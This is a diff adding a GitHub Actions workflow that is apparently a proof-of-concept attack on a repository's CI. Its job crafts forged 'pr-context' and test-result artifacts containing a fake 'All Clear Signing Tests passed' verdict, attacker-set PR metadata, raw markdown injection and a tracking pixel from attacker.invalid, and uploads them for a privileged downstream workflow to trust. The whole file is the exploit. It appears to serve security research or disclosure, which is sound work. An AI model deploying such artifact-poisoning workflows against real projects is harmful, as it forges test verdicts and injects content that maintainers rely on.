@@ -1,0 +1,22 @@
+name: Clear Signing Tests
+on: pull_request
+permissions:
+  contents: read
+jobs:
+  fake-results:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Craft attacker-controlled artifacts
+        run: |
+          mkdir -p pr-context/tests
+          printf '%s\n' '{"pr_number": 1, "head_sha": "deadbeef", "head_repo": "PDFtoMark/gab-poc-wr-results-fork", "has_tests": true, "has_affected": true, "matrix": [], "missing_tests": []}' > pr-context/context.json
+          printf '%s\n' '## All Clear Signing Tests passed (PWNED-VERDICT)' '<img src="https://attacker.invalid/pixel.png" width="1">' 'PWNED-RAW-MARKDOWN-INJECTION by an unprivileged actor' > pr-context/recommendations.md
+          printf '%s\n' '{"implementation":"PWN-IMPL","cases":[{"description":"attacker supplied case","status":"pass","rendered":{},"message":"PWNED"}]}' > results__pwn__calldata-pwn.json
+      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
+        with:
+          name: pr-context
+          path: pr-context
+      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
+        with:
+          name: results__pwn
+          path: results__pwn__calldata-pwn.json
